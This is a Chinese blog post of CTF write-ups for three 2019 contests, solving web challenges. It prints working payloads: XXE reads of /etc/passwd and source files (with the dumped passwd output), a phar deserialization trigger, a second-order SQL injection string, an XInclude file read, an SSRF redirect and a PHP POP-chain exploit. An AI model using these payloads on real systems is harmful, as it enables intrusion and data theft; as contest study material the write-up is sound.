<!DOCTYPE html>
<html lang="en">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="湖湘杯+红帽杯+百越杯wp"/>




  <meta name="keywords" content="wp," />





  <link rel="alternate" href="/default" title="glotozz'blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="https://glotozz.github.io/2019/11/09/湖湘杯-红帽杯-百越杯wp/"/>


<meta property="og:type" content="article">
<meta property="og:title" content="湖湘杯+红帽杯+百越杯wp">
<meta property="og:url" content="https://glotozz.github.io/2019/11/09/%E6%B9%96%E6%B9%98%E6%9D%AF-%E7%BA%A2%E5%B8%BD%E6%9D%AF-%E7%99%BE%E8%B6%8A%E6%9D%AFwp/index.html">
<meta property="og:site_name" content="glotozz&#39;blog">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2019/11/09/FjNWuXaKA72f5MI.png">
<meta property="og:image" content="https://i.loli.net/2019/11/10/OUVKiBwvs3qFESf.png">
<meta property="og:image" content="https://i.loli.net/2019/11/10/CUjO2JopMFfTPN8.png">
<meta property="og:image" content="https://i.loli.net/2019/11/10/DWrehYLz9multZy.png">
<meta property="og:image" content="https://i.loli.net/2019/11/10/WFSL1eOtUuYpZ3v.png">
<meta property="article:published_time" content="2019-11-09T11:16:24.000Z">
<meta property="article:modified_time" content="2020-03-31T00:34:46.718Z">
<meta property="article:author" content="glotozz">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2019/11/09/FjNWuXaKA72f5MI.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  


<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/song/media/outer/url?id=28592088.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="/57a2_fa12_13ff_c310c1889d0f14b24334ad7afef6b9b1.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
    <title> 湖湘杯+红帽杯+百越杯wp - glotozz'blog </title>
  <meta name="generator" content="Hexo 4.2.0"></head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">glotozz'blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/read">
                            
                            
                                Read
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/stars">
                            
                            
                                Stars
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          湖湘杯+红帽杯+百越杯wp
        
      </h1>

      <time class="post-time">
          Nov 09 2019
      </time>
    </header>



    
            <div class="post-content">
            <meta name="referrer" content="no-referrer">
<a id="more"></a>

<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
<!-- toc -->

<ul>
<li><a href="#湖湘杯">湖湘杯</a><ul>
<li><a href="#web1">web1</a></li>
<li><a href="#web2">web2</a></li>
<li><a href="#创新方向4">创新方向4</a></li>
<li><a href="#创新方向5">创新方向5</a></li>
</ul>
</li>
<li><a href="#红帽杯">红帽杯</a><ul>
<li><a href="#web1-bank_service">web1 bank_service</a></li>
<li><a href="#web2-ticket_system">web2 ticket_system</a></li>
</ul>
</li>
<li><a href="#百越杯">百越杯</a><ul>
<li><a href="#第一题">第一题</a></li>
<li><a href="#第二题">第二题</a></li>
</ul>
</li>
<li><a href="#参考链接">参考链接</a></li>
</ul>
<!-- tocstop -->

<hr>
<h3><span id="湖湘杯">湖湘杯</span></h3><h4><span id="web1">web1</span></h4><p>参考链接1，应该是非预期解，复现即可</p>
<p>唯一的区别是传入的url需要前缀<code>http</code>，可以加个重定向</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	header(&quot;Location:listen:&#x2F;&#x2F;listen.xyz&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4><span id="web2">web2</span></h4><p><code>tp5</code>的历史<code>RCE</code>漏洞，之前复现过，一把梭</p>
<h4><span id="创新方向4">创新方向4</span></h4><p>参考链接2，复现即可</p>
<h4><span id="创新方向5">创新方向5</span></h4><p><img src="https://i.loli.net/2019/11/09/FjNWuXaKA72f5MI.png" alt="Snipaste_2019-11-09_22-33-54.png"></p>
<p>参考链接3，前半部分，主要就是<code>＄</code>非<code>$</code></p>
<p>构造</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyone&#x3D;00000000000000000000000000000000000000000000000000000000000000000000006666672%EF%BC%84</span><br></pre></td></tr></table></figure>

<p>然后是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(strstr($_SERVER[&#39;REQUEST_URI&#39;],&#39;You_Are_Cool&#39;))&#123;</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只需要利用<code>url编码</code>绕过即可</p>
<p>然后是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(mime_content_type($f) &#x3D;&#x3D; &#39;application&#x2F;vnd.font-fontforge-sfd&#39;)&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一开始想着改<code>Content-Type</code>，发现修改对结果没有影响，修改内容头部发现有用，搜索一波发现如下即可绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SplineFontDB: 3.0</span><br></pre></td></tr></table></figure>

<p>最后一步卡住了，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(!strstr($filename,&quot;.&quot;))&#123;</span><br><span class="line">	echo &quot;ok33&quot;;</span><br><span class="line">	echo $filename;</span><br><span class="line">	file_put_contents(&#39;&#x2F;tmp&#x2F;&#39;.$filename,$secert);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>无法绕过<code>.</code>就无法遍历目录，也没找到目录遍历、文件包含等漏洞</p>
<p>session存在于tmp目录下，但是即使覆盖也缺少后续利用的地方</p>
<hr>
<h3><span id="红帽杯">红帽杯</span></h3><h4><span id="web1-bank_service">web1    bank_service</span></h4><p><code>nodejs</code>搭建的聊天室，猜测是原型链污染。好吧不是</p>
<p>参考： <a href="https://blog.zeddyu.info/2019/11/13/Red-Hat-2019/#bank-service" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/11/13/Red-Hat-2019/#bank-service</a> </p>
<p>考点是<code>solr RCE</code>    ，没有环境鸽了</p>
<h4><span id="web2-ticket_system">web2    ticket_system</span></h4><p>XXE读源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [  </span><br><span class="line">	&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;ticket&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;code&gt;123123&lt;&#x2F;code&gt;&lt;&#x2F;ticket&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;app&#x2F;controller&#x2F;Index.php&quot;&gt;</span><br><span class="line">&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;app&#x2F;controller&#x2F;Ticket.php&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><code>/etc/passwd</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">mysql:x:101:101:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure>

<p><code>Index.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; +----------------------------------------------------------------------</span><br><span class="line">&#x2F;&#x2F; | ThinkPHP [ WE CAN DO IT JUST THINK ]</span><br><span class="line">&#x2F;&#x2F; +----------------------------------------------------------------------</span><br><span class="line">&#x2F;&#x2F; | Copyright (c) 2006-2018 http:&#x2F;&#x2F;thinkphp.cn All rights reserved.</span><br><span class="line">&#x2F;&#x2F; +----------------------------------------------------------------------</span><br><span class="line">&#x2F;&#x2F; | Licensed ( http:&#x2F;&#x2F;www.apache.org&#x2F;licenses&#x2F;LICENSE-2.0 )</span><br><span class="line">&#x2F;&#x2F; +----------------------------------------------------------------------</span><br><span class="line">&#x2F;&#x2F; | Author: liu21st &lt;liu21st@gmail.com&gt;</span><br><span class="line">&#x2F;&#x2F; +----------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; [ åºç¨å¥å£æä»¶ ]</span><br><span class="line">namespace think;</span><br><span class="line"></span><br><span class="line">require __DIR__ . &#39;&#x2F;..&#x2F;vendor&#x2F;autoload.php&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; æ§è¡HTTPåºç¨å¹¶ååº</span><br><span class="line">(new App())-&gt;http-&gt;run()-&gt;send();</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\controller;</span><br><span class="line">use think\facade\Session;</span><br><span class="line"></span><br><span class="line">class Index extends Base</span><br><span class="line">&#123;</span><br><span class="line">    public $view;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        parent::__construct(False);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;view-&gt;fetch(&quot;index&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function login()</span><br><span class="line">    &#123;</span><br><span class="line">        $username &#x3D; $this-&gt;request-&gt;post(&quot;username&quot;);</span><br><span class="line">        $password &#x3D; $this-&gt;request-&gt;post(&quot;password&quot;);</span><br><span class="line">        Session::clear();</span><br><span class="line">        Session::set(&quot;username&quot;,$username);</span><br><span class="line">        Session::set(&quot;password&quot;,$password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提示需要<code>RCE</code>，很容易联想到<code>tp5的RCE</code>,配合<code>phar</code>反序列化，这里反序列化的入口点是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [  </span><br><span class="line">	&lt;!ENTITY xxe SYSTEM &quot;phar:&#x2F;&#x2F;&#x2F;tmp&#x2F;xxx&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;ticket&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;code&gt;123123&lt;&#x2F;code&gt;&lt;&#x2F;ticket&gt;</span><br></pre></td></tr></table></figure>

<p>然后参考之前写的文章即可</p>
<h3><span id="百越杯">百越杯</span></h3><h4><span id="第一题">第一题</span></h4><p> 一道二次注入，注册处利用查询的用户名截取一定长度来可以进行引号逃逸。 </p>
<blockquote>
<p>测试发现30位的时候成功逃逸为<code>admin[24个空格]\</code></p>
</blockquote>
<p>二次查询的时候变成如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;admin           \&#39; and msgid&#x3D;&#39;1&#39;;</span><br><span class="line"></span><br><span class="line">#攻击语句</span><br><span class="line">select * from users where username&#x3D;&#39;admin           \&#39; and msgid&#x3D;&#39; or 1#&#39;;</span><br></pre></td></tr></table></figure>

<p>那么后面就可以盲注了</p>
<p>第二步，</p>
<blockquote>
<p>导入外部<code>xml文档</code>，类似于php的<code>include</code>，将外部定义的<code>dtd</code>引入当前文件，因为引入外部实体具有局限性，所以使用<code>xinclude</code>来引入 </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">content&#x3D;&lt;root xmlns:xi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XInclude&quot;&gt;</span><br><span class="line"> &lt;xi:include href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;flag&quot; parse&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>



<h4><span id="第二题">第二题</span></h4><p>原题小改</p>
<p>将<code>Read</code>类中的<code>$var</code>变量修改为私有属性，可以轻松绕过</p>
<p>好像把flag位置也换了，我本地测就不管了😀</p>
<p><img src="https://i.loli.net/2019/11/10/OUVKiBwvs3qFESf.png" alt="Snipaste_2019-11-10_13-02-39.png"></p>
<p><img src="https://i.loli.net/2019/11/10/CUjO2JopMFfTPN8.png" alt="Snipaste_2019-11-10_13-02-49.png"></p>
<p><img src="https://i.loli.net/2019/11/10/DWrehYLz9multZy.png" alt="Snipaste_2019-11-10_13-03-12.png"></p>
<p>反序列化，首先寻找魔术方法触发点</p>
<p><code>Show</code>类的<code>__construct()</code>可以作为入口，<code>echo</code>时</p>
<p>调用<code>__toString()</code>，需要把<code>$this-&gt;source</code>设置为<code>Show</code>类</p>
<blockquote>
<p>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code>方法会被自动调用。 </p>
</blockquote>
<p>那么观察到<code>Test</code>类中存在<code>return $func()</code>，需要调用<code>__get()</code>，即调用不存在的变量</p>
<p>也就是说只需要把<code>str[&#39;str&#39;]</code>设置为<code>Test</code>类即可，会调用不存在的<code>source</code></p>
<p>再把<code>Test</code>类的<code>$params</code>设置为<code>Read</code>类即可触发<code>__invoke()</code></p>
<p>构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(3);</span><br><span class="line">class Read &#123;</span><br><span class="line">    private $var &#x3D; &#39;fllllllaaaaaag&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c &#x3D; new Read();</span><br><span class="line">$b &#x3D; new Test();</span><br><span class="line">$b-&gt;params &#x3D; $c;</span><br><span class="line">$d &#x3D; new Show();</span><br><span class="line">$d-&gt;str &#x3D; array(&#39;str&#39;&#x3D;&gt;$b);</span><br><span class="line">$a &#x3D; new Show();</span><br><span class="line">$a-&gt;source &#x3D; $d;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/11/10/WFSL1eOtUuYpZ3v.png" alt="Snipaste_2019-11-10_14-12-23.png"></p>
<h3><span id="参考链接">参考链接</span></h3><p><a href="https://1isten.xyz/2018/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9ssrf%E7%9A%84%E7%90%86%E8%A7%A3/" target="_blank" rel="noopener">https://1isten.xyz/2018/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9ssrf%E7%9A%84%E7%90%86%E8%A7%A3/</a></p>
<p> <a href="https://ray-cp.github.io/archivers/CVE-2017-17562-GoAhead-rce?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/CVE-2017-17562-GoAhead-rce?tdsourcetag=s_pctim_aiomsg</a> </p>
<p><a href="https://cloud.tencent.com/developer/article/1366247?client=tim&amp;ADUIN=243536998&amp;ADSESSION=1573306397&amp;ADTAG=CLIENT.QQ.5603_.0&amp;ADPUBNO=26933" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1366247?client=tim&amp;ADUIN=243536998&amp;ADSESSION=1573306397&amp;ADTAG=CLIENT.QQ.5603_.0&amp;ADPUBNO=26933</a> </p>
<p> <a href="https://www.cnblogs.com/20175211lyz/p/11560311.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11560311.html</a></p>

            </div>
          

    
      <footer class="post-footer">

        
         <div>    
          
          <ul class="post-copyright">
             <li class="post-copyright-link">
              <strong>本文作者：</strong>
              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
            </li>

            <li class="post-copyright-license">
              <strong>版权声明： </strong>
               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
            </li>
          </ul>
        
      </div>
      
        <div class="post-tags">
          
            <a href="/tags/wp/" rel="tag"><i class="fa fa-tag"></i> wp</a>
          
        </div>
      

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2019/11/16/%E5%A4%8D%E7%8E%B0%E5%87%A0%E4%B8%AA%E8%BF%91%E6%9C%9F%E6%BC%8F%E6%B4%9E/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">复现几个漏洞</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2019/11/08/phpcms-v9-6-0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
        <span class="next-text nav-default">phpcms_v9.6.0SQL注入漏洞分析</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
      <div id="vcomments"></div>
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon">
<span class="copyright-year">
    
        &copy;
    
    2020
    <span class="footer-author">glotozz.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
    </span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    



  
<!-- valine Comments -->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
<script type="text/javascript">
    new Valine({
        el: '#vcomments',
        notify: false,
        verify: false,
        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
        placeholder: "Just go go",
        avatar: 'mm'
    });
</script>


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

    <!-- 代码块复制功能 -->
  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
  </body>
</html>
